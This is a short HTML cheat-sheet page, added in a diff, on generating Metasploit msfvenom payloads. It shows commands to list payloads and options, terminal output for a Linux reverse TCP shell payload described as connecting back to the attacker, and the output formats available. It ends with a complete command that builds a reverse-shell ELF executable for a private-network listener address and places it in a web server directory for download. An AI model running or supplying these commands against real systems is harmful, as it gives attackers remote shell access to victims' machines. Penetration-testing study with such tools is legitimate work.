@@ -1,0 +1,30 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>msfvenom payload</title>
+</head><body><b>List all payloads </b>- msfvenom -l payloads<br/>
+<b>List payload option</b>&nbsp;- msfvenom -p linux/x64/shell_reverse_tcp --payload-options<br/>
+<br/>
+root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp --payload-options<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;Name: Linux Command Shell, Reverse TCP Inline<br/>
+&nbsp; &nbsp; &nbsp;Module: payload/linux/x86/shell_reverse_tcp<br/>
+Basic options:<br/>
+Name &nbsp; Current Setting &nbsp;Required &nbsp;Description<br/>
+---- &nbsp; --------------- &nbsp;-------- &nbsp;-----------<br/>
+CMD &nbsp; &nbsp;/bin/sh &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The command string to execute<br/>
+LHOST &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The listen address<br/>
+LPORT &nbsp;4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The listen port<br/>
+<br/>
+Description:<br/>
+&nbsp; Connect back to attacker and spawn a command shell<br/>
+&nbsp; &nbsp; ---- &nbsp;--------------- &nbsp;-------- &nbsp;-----------<br/>
+<br/>
+<b>List output format</b>&nbsp;- msfvenom -p linux/x86/shell_reverse_tcp --help-format<br/>
+Executable formats<br/>
+&#09;asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war<br/>
+Transform formats<br/>
+&#09;bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript<br/>
+<br/>
+<b>Example payload generation: </b>msfvenom -p linux/x86/shell_reverse_tcp CMD=/bin/sh LHOST=192.168.104.4 LPORT=4444 -f elf &gt; /var/www/html/shell<br/>
+</body></html>
